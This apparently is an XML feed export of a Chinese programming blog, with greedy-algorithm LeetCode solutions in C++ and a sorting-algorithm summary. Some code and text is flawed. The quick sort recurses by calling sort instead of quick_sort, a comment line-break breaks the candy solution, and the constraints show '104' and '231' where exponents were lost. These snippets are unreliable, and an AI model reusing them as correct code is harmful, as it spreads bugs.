<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    vector&lt;int&gt; partitionLabels(string s) 
	&#123;
		int n&#x3D;s.size();
		int alphbet[26];
		for(int i&#x3D;0;i&lt;n;++i)
		&#123;
			alphbet[s[i]-&#39;a&#39;]&#x3D;i;
		&#125;
		vector&lt;int&gt; _return ;
		int l&#x3D;0,r&#x3D;0,cnt&#x3D;0;
		for(int i&#x3D;0;i&lt;n;++i)
		&#123;
			r&#x3D;max(r,alphbet[s[i]-&#39;a&#39;]);
			if(i&#x3D;&#x3D;r) 
			&#123;
				_return.push_back(r-l+1);
				l&#x3D;r+1;
			&#125;
		&#125;
		return _return;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 452. 用最少数量的箭引爆气球</title>
    <url>/2021/04/10/Leetcode-452-%E7%94%A8%E6%9C%80%E5%B0%91%E6%95%B0%E9%87%8F%E7%9A%84%E7%AE%AD%E5%BC%95%E7%88%86%E6%B0%94%E7%90%83/</url>
    <content><![CDATA[<p><a href="https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons/">452. 用最少数量的箭引爆气球</a></p>
<a id="more"></a>

<p>用最少数量的箭引爆气球</p>
<pre><code> 在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标。

 一支弓箭可以沿着 x 轴从不同点完全垂直地射出。在坐标 x 处射出一支箭，若有一个气球的直径的开始和结束坐标为 `x``start`，`x``end`， 且满足  `xstart ≤ x ≤ x``end`，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。

 给你一个数组 `points` ，其中 `points [i] = [xstart,xend]` ，返回引爆所有气球所必须射出的最小弓箭数。

 **示例 1：**

 <pre class="line-numbers language-none"><code class="language-none">输入：points &#x3D; [[10,16],[2,8],[1,6],[7,12]]
输出：2
解释：对于该样例，x &#x3D; 6 可以射爆 [2,8],[1,6] 两个气球，以及 x &#x3D; 11 射爆另外两个气球<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

 **示例 2：**

 <pre class="line-numbers language-none"><code class="language-none">输入：points &#x3D; [[1,2],[3,4],[5,6],[7,8]]
输出：4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

 **示例 3：**

 <pre class="line-numbers language-none"><code class="language-none">输入：points &#x3D; [[1,2],[2,3],[3,4],[4,5]]
输出：2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

 **示例 4：**

 <pre class="line-numbers language-none"><code class="language-none">输入：points &#x3D; [[1,2]]
输出：1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

 **示例 5：**

 <pre class="line-numbers language-none"><code class="language-none">输入：points &#x3D; [[2,3],[2,3]]
输出：1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



 **提示：**

 - `0 &lt;= points.length &lt;= 104`
 - `points[i].length == 2`
 - `-231 &lt;= xstart &lt; xend &lt;= 231 - 1`</code></pre>
<p><strong>思路与算法</strong></p>
<p>我们首先随机地射出一支箭，再看一看是否能够调整这支箭地射出位置，使得我们可以引爆更多数目的气球。</p>
<p><img src="https://i.loli.net/2021/04/10/MP1XCWjsUrb2wZ9.png" alt="fig1"></p>
<p>如图 1-1 所示，我们随机射出一支箭，引爆了除红色气球以外的所有气球。我们称所有引爆的气球为「原本引爆的气球」，其余的气球为「原本完好的气球」。可以发现，如果我们将这支箭的射出位置稍微往右移动一点，那么我们就有机会引爆红色气球，如图 1-2 所示。</p>
<p>那么我们最远可以将这支箭往右移动多远呢？我们唯一的要求就是：原本引爆的气球只要仍然被引爆就行了。这样一来，我们找出原本引爆的气球中右边界位置最靠左的那一个，将这支箭的射出位置移动到这个右边界位置，这也是最远可以往右移动到的位置：如图 1-3 所示，只要我们再往右移动一点点，这个气球就无法被引爆了。</p>
<p>为什么「原本引爆的气球仍然被引爆」是唯一的要求？别急，往下看就能看到其精妙所在。</p>
<p>因此，我们可以断定：</p>
<p>一定存在一种最优（射出的箭数最小）的方法，使得每一支箭的射出位置都恰好对应着某一个气球的右边界。</p>
<p>这是为什么？我们考虑任意一种最优的方法，对于其中的任意一支箭，我们都通过上面描述的方法，将这支箭的位置移动到它对应的「原本引爆的气球中最靠左的右边界位置」，那么这些原本引爆的气球仍然被引爆。这样一来，所有的气球仍然都会被引爆，并且每一支箭的射出位置都恰好位于某一个气球的右边界了。</p>
<p>有了这样一个有用的断定，我们就可以快速得到一种最优的方法了。考虑所有气球中右边界位置最靠左的那一个，那么一定有一支箭的射出位置就是它的右边界（否则就没有箭可以将其引爆了）。当我们确定了一支箭之后，我们就可以将这支箭引爆的所有气球移除，并从剩下未被引爆的气球中，再选择右边界位置最靠左的那一个，确定下一支箭，直到所有的气球都被引爆。</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    int findMinArrowShots(vector&lt;vector&lt;int&gt;&gt;&amp; s) 
    &#123;
        int n&#x3D;s.size();
		if(s.empty()) return 0;
		sort(s.begin(),s.end(),[](vector&lt;int&gt; &amp;a,vector&lt;int&gt; &amp;b)
		&#123;
			return a[1]&lt;b[1];
		&#125;);
		int cnt&#x3D;1,t&#x3D;s[0][1];
		for(int i&#x3D;1;i&lt;n;++i)
		&#123;
			if(s[i][0] &gt;t)
			&#123;
				++cnt;
				t&#x3D;s[i][1];
			&#125;
		&#125;
		return cnt;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 605. 种花问题</title>
    <url>/2021/04/10/Leetcode-605-%E7%A7%8D%E8%8A%B1%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。</p>
<a id="more"></a>
<ol start="605">
<li><h4 id="605-种花问题"><a href="#605-种花问题" class="headerlink" title="605. 种花问题"></a><a href="https://leetcode-cn.com/problems/can-place-flowers/">605. 种花问题</a></h4></li>
</ol>
<pre><code> 假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。

 给你一个整数数组 `flowerbed` 表示花坛，由若干 `0` 和 `1` 组成，其中 `0` 表示没种植花，`1` 表示种植了花。另有一个数 `n` ，能否在不打破种植规则的情况下种入 `n` 朵花？能则返回 `true` ，不能则返回 `false`。



 **示例 1：**

 <pre class="line-numbers language-none"><code class="language-none">输入：flowerbed &#x3D; [1,0,0,0,1], n &#x3D; 1
输出：true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

 **示例 2：**

 <pre class="line-numbers language-none"><code class="language-none">输入：flowerbed &#x3D; [1,0,0,0,1], n &#x3D; 2
输出：false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



 **提示：**

 - `1 &lt;= flowerbed.length &lt;= 2 * 104`
 - `flowerbed[i]` 为 `0` 或 `1`
 - `flowerbed` 中不存在相邻的两朵花
 - `0 &lt;= n &lt;= flowerbed.length`</code></pre>
<blockquote>
<pre><code>【思路】
   从左向右遍历花坛，在可以种花的地方就种一朵，能种就种（因为在任一种花时候，不种都不会得到更优解），就是一种贪心的思想
   这里可以种花的条件是：</code></pre>
</blockquote>
<ul>
<li>自己为空</li>
<li>左边为空 或者 自己是最左</li>
<li>右边为空 或者 自己是最右</li>
<li>最后判断n朵花是否有剩余，为了效率起见，可以在种花的过程中做判断，-一旦花被种完就返回true</li>
</ul>
<p>​     </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    bool canPlaceFlowers(vector&lt;int&gt;&amp; f, int n) 
	&#123;
		int num&#x3D;f.size();
		for(int i&#x3D;0;i&lt;num;++i)
		&#123;
			if(f[i]&#x3D;&#x3D;0 &amp;&amp; (i&#x3D;&#x3D;0 || f[i-1]&#x3D;&#x3D; 0) &amp;&amp; (i&#x3D;&#x3D;num-1 || f[i+1]&#x3D;&#x3D;0))
			&#123;
				--n;
				if(n&lt;&#x3D;0) return true;
				f[i]&#x3D;1;
			&#125;
				
		&#125;
		return n&lt;&#x3D;0;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 435. 无重叠区间</title>
    <url>/2021/04/10/Leetcode-435-%E6%97%A0%E9%87%8D%E5%8F%A0%E5%8C%BA%E9%97%B4/</url>
    <content><![CDATA[<p>给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。</p>
<a id="more"></a>
<h4 id="435-无重叠区间"><a href="#435-无重叠区间" class="headerlink" title="435. 无重叠区间"></a><a href="https://leetcode-cn.com/problems/non-overlapping-intervals/">435. 无重叠区间</a></h4><p>难度中等398</p>
<p><strong>注意:</strong></p>
<ol>
<li>可以认为区间的终点总是大于它的起点。</li>
<li>区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。</li>
</ol>
<p><strong>示例 1:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: [ [1,2], [2,3], [3,4], [1,3] ]

输出: 1

解释: 移除 [1,3] 后，剩下的区间没有重叠。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: [ [1,2], [1,2], [1,2] ]

输出: 2

解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 3:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: [ [1,2], [2,3] ]

输出: 0

解释: 你不需要移除任何区间，因为它们已经是无重叠的了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>题解<br>求最少的移除区间个数，等价于尽量多保留不重叠的区间。在选择要保留区间时，区间的结<br>尾十分重要：选择的区间结尾越小，余留给其它区间的空间就越大，就越能保留更多的区间。因<br>此，我们采取的贪心策略为，优先保留结尾小且不相交的区间。<br>具体实现方法为，先把区间按照结尾的大小进行增序排序，每次选择结尾最小且和前一个选<br>择的区间不重叠的区间。我们这里使用 C++ 的 Lambda，结合 std::sort() 函数进行自定义排<br>序。<br>在样例中，排序后的数组为 [[1,2], [1,3], [2,4]]。按照我们的贪心策略，首先初始化为区间<br>[1,2]；由于 [1,3] 与 [1,2] 相交，我们跳过该区间；由于 [2,4] 与 [1,2] 不相交，我们将其保留。因<br>此最终保留的区间为 [[1,2], [2,4]]。</p>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    int eraseOverlapIntervals(vector&lt;vector&lt;int&gt;&gt;&amp; s) 
	&#123;
		int n&#x3D;s.size();
		if(s.empty()) return 0;
		sort(s.begin(),s.end(),[](vector&lt;int&gt; &amp;a,vector&lt;int&gt; &amp;b)
		&#123;
			return a[1]&lt;b[1];
		&#125;);
		int cnt&#x3D;0,t&#x3D;s[0][1];
		for(int i&#x3D;1;i&lt;n;++i)
		&#123;
			if(s[i][0] &lt;t)
				++cnt;
			else
			&#123;
				t&#x3D;s[i][1];
			&#125;
		&#125;
		return cnt;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Leetcode 135. 分发糖果</title>
    <url>/2021/04/10/Leetcode-135-%E5%88%86%E5%8F%91%E7%B3%96%E6%9E%9C/</url>
    <content><![CDATA[<p>老师想给孩子们分发糖果，有 <em>N</em> 个孩子站成了一条直线，老师会根据每个孩子的表现，预先给他们评分。</p>
<a id="more"></a>
<h4 id="135-分发糖果"><a href="#135-分发糖果" class="headerlink" title="135. 分发糖果"></a><a href="https://leetcode-cn.com/problems/candy/">135. 分发糖果</a></h4><p>难度困难</p>
<p>你需要按照以下要求，帮助老师给这些孩子分发糖果：</p>
<ul>
<li>每个孩子至少分配到 1 个糖果。</li>
<li>评分更高的孩子必须比他两侧的邻位孩子获得更多的糖果。</li>
</ul>
<p>那么这样下来，老师至少需要准备多少颗糖果呢？</p>
<p><strong>示例 1：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：[1,0,2]
输出：5
解释：你可以分别给这三个孩子分发 2、1、2 颗糖果。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入：[1,2,2]
输出：4
解释：你可以分别给这三个孩子分发 1、2、1 颗糖果。
     第三个孩子只得到 1 颗糖果，这已满足上述两个条件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<ul>
<li>题解<br>做完了题目 455，你会不会认为存在比较关系的贪心策略一定需要排序或是选择？虽然这一<br>道题也是运用贪心策略，但我们只需要简单的两次遍历即可：把所有孩子的糖果数初始化为 1；<br>先从左往右遍历一遍，如果右边孩子的评分比左边的高，则右边孩子的糖果数更新为左边孩子的<br>糖果数加 1；再从右往左遍历一遍，如果左边孩子的评分比右边的高，且左边孩子当前的糖果数<br>不大于右边孩子的糖果数，则左边孩子的糖果数更新为右边孩子的糖果数加 1。通过这两次遍历，<br>分配的糖果就可以满足题目要求了。这里的贪心策略即为，在每次遍历中，只考虑并更新相邻一<br>侧的大小关系。<br>在样例中，我们初始化糖果分配为 [1,1,1]，第一次遍历更新后的结果为 [1,1,2]，第二次遍历<br>更新后的结果为 [2,1,2]。</li>
</ul>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int candy(vector&lt;int&gt; &amp;ratings)
&#123;
    int size &#x3D; ratings.size();
    if (size &lt; 2)
    &#123;
        return size;
    &#125;
    vector&lt;int&gt; num(size, 1);
    for (int i &#x3D; 1; i &lt; size; ++i)
    &#123;
        if (ratings[i] &gt; ratings[i - 1])
        &#123;
            num[i] &#x3D; num[i - 1] + 1;
        &#125;
    &#125;
    for (int i &#x3D; size - 1; i &gt; 0; --i)
    &#123;
        if (ratings[i] &lt; ratings[i - 1])
        &#123;
            num[i - 1] &#x3D; max(num[i - 1], num[i] + 1);
        &#125;
    &#125;
    return accumulate(num.begin(), num.end(), 0); &#x2F;&#x2F; std::accumulate 可以很方便
    地求和
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>Leetcode 455. 分发饼干</title>
    <url>/2021/04/10/Leetcode-455-%E5%88%86%E5%8F%91%E9%A5%BC%E5%B9%B2/</url>
    <content><![CDATA[<p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。</p>
<a id="more"></a>
<p>对每个孩子 <code>i</code>，都有一个胃口值 <code>g[i]</code>，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 <code>j</code>，都有一个尺寸 <code>s[j]</code> 。如果 <code>s[j] &gt;= g[i]</code>，我们可以将这个饼干 <code>j</code> 分配给孩子 <code>i</code> ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。</p>
<p><strong>示例 1:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: g &#x3D; [1,2,3], s &#x3D; [1,1]
输出: 1
解释: 
你有三个孩子和两块小饼干，3个孩子的胃口值分别是：1,2,3。
虽然你有两块小饼干，由于他们的尺寸都是1，你只能让胃口值是1的孩子满足。
所以你应该输出1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: g &#x3D; [1,2], s &#x3D; [1,2,3]
输出: 2
解释: 
你有两个孩子和三块小饼干，2个孩子的胃口值分别是1,2。
你拥有的饼干数量和尺寸都足以让所有孩子满足。
所以你应该输出2.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= g.length &lt;= 3 * 104</code></li>
<li><code>0 &lt;= s.length &lt;= 3 * 104</code></li>
<li><code>1 &lt;= g[i], s[j] &lt;= 231 - 1</code></li>
</ul>
<blockquote>
<ul>
<li>题解<br>因为饥饿度最小的孩子最容易吃饱，所以我们先考虑这个孩子。为了尽量使得剩下的饼干可<br>以满足饥饿度更大的孩子，所以我们应该把大于等于这个孩子饥饿度的、且大小最小的饼干给这<br>个孩子。满足了这个孩子之后，我们采取同样的策略，考虑剩下孩子里饥饿度最小的孩子，直到<br>没有满足条件的饼干存在。</li>
</ul>
<p>2.2 分配问题<br>– 4/143 –<br>简而言之，这里的贪心策略是，给剩余孩子里最小饥饿度的孩子分配最小的能饱腹的饼干。<br>至于具体实现，因为我们需要获得大小关系，一个便捷的方法就是把孩子和饼干分别排序。<br>这样我们就可以从饥饿度最小的孩子和大小最小的饼干出发，计算有多少个对子可以满足条件。<br> 注意 对数组或字符串排序是常见的操作，方便之后的大小比较。<br>注意 在之后的讲解中，若我们谈论的是对连续空间的变量进行操作，我们并不会明确区分数组<br>和字符串，因为他们本质上都是在连续空间上的有序变量集合。一个字符串“abc”可以被看作一<br>个数组 [‘a’,‘b’,‘c’]。</p>
</blockquote>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">
class Solution &#123;
public:
    int findContentChildren(vector&lt;int&gt;&amp; g, vector&lt;int&gt;&amp; s) 
	&#123;
		sort(g.begin(),g.end());
		sort(s.begin(),s.end());
		int child&#x3D;0,cookie&#x3D;0;
		while(child&lt;g.size() &amp;&amp; cookie&lt;s.size())
		&#123;
			if(g[child] &lt;&#x3D; s[cookie])
				++child;
				++cookie;
		&#125;
		return child;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Leetcode 3. 无重复字符的最长子串</title>
    <url>/2021/04/10/Leetcode-3-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/</url>
    <content><![CDATA[<p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。</p>
<a id="more"></a>
<h4 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h4><p>给定一个字符串，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p>
<p><strong>示例 1:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: s &#x3D; &quot;abcabcbb&quot;
输出: 3 
解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 2:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: s &#x3D; &quot;bbbbb&quot;
输出: 1
解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 3:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: s &#x3D; &quot;pwwkew&quot;
输出: 3
解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。
     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>示例 4:</strong></p>
<pre class="line-numbers language-none"><code class="language-none">输入: s &#x3D; &quot;&quot;
输出: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>提示：</strong></p>
<ul>
<li><p><code>0 &lt;= s.length &lt;= 5 * 104</code></p>
</li>
<li><p><code>s</code> 由英文字母、数字、符号和空格组成</p>
</li>
</ul>
<p>  <img src="C:\Users\LHL\AppData\Roaming\Typora\typora-user-images\image-20210410095036741.png" alt="image-20210410095036741"></p>
<p>  <img src="https://i.loli.net/2021/04/10/9TuJVUmso8ZzBEW.png" alt="image-20210410095103513"><img src="https://i.loli.net/2021/04/10/xdZKcFL7vDs1rgY.png" alt="image-20210410094844274"></p>
<p><img src="https://i.loli.net/2021/04/10/UTAsZqPuCJjgfQX.png" alt="image-20210410094942013"></p>
<p><img src="https://i.loli.net/2021/04/10/bWS8f5plzv1wZAB.png" alt="image-20210410094951727"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
    int lengthOfLongestSubstring(string s) 
    &#123;
    	int n&#x3D;s.size();
    	unordered_set&lt;char&gt; sum;
    	int k&#x3D;-1;
    	int cnt&#x3D;0;
    	for(int i&#x3D;0;i&lt;n;i++)
    	&#123;
    		if(i!&#x3D;0)
    			sum.erase(s[i-1]);
    		while(k+1  &lt; n &amp;&amp; !sum.count(s[k+1]))
    		&#123;
    			sum.insert(s[k+1]);
    			++k;
    		&#125;
    		cnt&#x3D;max(cnt,k-i+1);
    	&#125;
    	return cnt;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>10大排序算法总结</title>
    <url>/2021/04/10/10%E5%A4%A7%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>排序算法的分类：<br>1插入：插入，折半插入，希尔<br>2交换：冒泡，快速<br>3选择：简单选择，堆<br>4归并：归并（不只二路归并）<br>5基数：</p>
<a id="more"></a>
<p><img src="https://i.loli.net/2021/04/10/nHVYclxe41qkA5a.png" alt="sort.png"></p>
<p>1插入排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void insert_sort()
&#123;
    for (int i &#x3D; 1; i &lt; n; i ++ )
    &#123;
        int x &#x3D; a[i];
        int j &#x3D; i-1;

        while (j &gt;&#x3D; 0 &amp;&amp; x &lt; a[j])
        &#123;
            a[j+1] &#x3D; a[j];
            j -- ;
        &#125;
        a[j+1] &#x3D; x;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2选择排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void select_sort()
&#123;
    for (int i &#x3D; 0; i &lt; n; i ++ )
    &#123;
        int k &#x3D; i;
        for (int j &#x3D; i+1; j &lt; n; j ++ )
        &#123;
            if (a[j] &lt; a[k])
                k &#x3D; j;
        &#125;
        swap(a[i], a[k]);
    &#125;

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>3冒泡排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void bubble_sort()
&#123;
    for (int i &#x3D; n-1; i &gt;&#x3D; 1; i -- )
    &#123;
        bool flag &#x3D; true;
        for (int j &#x3D; 1; j &lt;&#x3D; i; j ++ )
            if (a[j-1] &gt; a[j])
            &#123;
                swap(a[j-1], a[j]);
                flag &#x3D; false;
            &#125;
        if (flag) return;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>4希尔排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void shell_sort()
&#123;
    for (int gap &#x3D; n &gt;&gt; 1; gap; gap &gt;&gt;&#x3D; 1)
    &#123;
        for (int i &#x3D; gap; i &lt; n; i ++ )
        &#123;
            int x &#x3D; a[i];
            int j;
            for (j &#x3D; i; j &gt;&#x3D; gap &amp;&amp; a[j-gap] &gt; x; j -&#x3D; gap)
                a[j] &#x3D; a[j-gap];
            a[j] &#x3D; x;
        &#125;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>5快速排序（最快）</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void quick_sort(int l, int r)
&#123;
    if (l &gt;&#x3D; r) return ;

    int x &#x3D; a[l+r&gt;&gt;1], i &#x3D; l-1, j &#x3D; r+1;
    while (i &lt; j)
    &#123;
        while (a[++ i] &lt; x);
        while (a[-- j] &gt; x);
        if (i &lt; j) swap(a[i], a[j]);
    &#125;
    sort(l, j), sort(j+1, r);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>6归并排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void merge_sort(int l, int r)
&#123;
    if (l &gt;&#x3D; r) return;
    int temp[N];
    int mid &#x3D; l+r&gt;&gt;1;
    merge_sort(l, mid), merge_sort(mid+1, r);
    int k &#x3D; 0, i &#x3D; l, j &#x3D; mid+1;
    while (i &lt;&#x3D; mid &amp;&amp; j &lt;&#x3D; r)
    &#123;
        if (a[i] &lt; a[j]) temp[k ++ ] &#x3D; a[i ++ ];
        else temp[k ++ ] &#x3D; a[j ++ ];

    &#125;
    while (i &lt;&#x3D; mid) temp[k ++ ] &#x3D; a[i ++ ];
    while (j &lt;&#x3D; r) temp[k ++ ] &#x3D; a[j ++ ];
    for (int i &#x3D; l, j &#x3D; 0; i &lt;&#x3D; r; i ++ , j ++ ) a[i] &#x3D; temp[j];
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>7堆排序（须知此排序为使用了模拟堆，为了使最后一个非叶子节点的编号为n/2，数组编号从1开始）<br><a href="https://www.cnblogs.com/wanglei5205/p/8733524.html">https://www.cnblogs.com/wanglei5205/p/8733524.html</a></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void down(int u)
&#123;
    int t &#x3D; u;
    if (u&lt;&lt;1 &lt;&#x3D; n &amp;&amp; h[u&lt;&lt;1] &lt; h[t]) t &#x3D; u&lt;&lt;1;
    if ((u&lt;&lt;1|1) &lt;&#x3D; n &amp;&amp; h[u&lt;&lt;1|1] &lt; h[t]) t &#x3D; u&lt;&lt;1|1;
    if (u !&#x3D; t)
    &#123;
        swap(h[u], h[t]);
        down(t);
    &#125;
&#125;

int main()
&#123;
    for (int i &#x3D; 1; i &lt;&#x3D; n; i ++ ) cin &gt;&gt; h[i];
    for (int i &#x3D; n&#x2F;2; i; i -- ) down(i);
    while (true)
    &#123;
        if (!n) break;
        cout &lt;&lt; h[1] &lt;&lt; &#39; &#39;;
        h[1] &#x3D; h[n];
        n -- ;
        down(1);
    &#125;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>8基数排序</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int maxbit()
&#123;
    int maxv &#x3D; a[0];
    for (int i &#x3D; 1; i &lt; n; i ++ )
        if (maxv &lt; a[i])
            maxv &#x3D; a[i];
    int cnt &#x3D; 1;
    while (maxv &gt;&#x3D; 10) maxv &#x2F;&#x3D; 10, cnt ++ ;

    return cnt;
&#125;
void radixsort()
&#123;
    int t &#x3D; maxbit();
    int radix &#x3D; 1;

    for (int i &#x3D; 1; i &lt;&#x3D; t; i ++ )
    &#123;
        for (int j &#x3D; 0; j &lt; 10; j ++ ) count[j] &#x3D; 0;
        for (int j &#x3D; 0; j &lt; n; j ++ )
        &#123;
            int k &#x3D; (a[j] &#x2F; radix) % 10;
            count[k] ++ ;
        &#125;
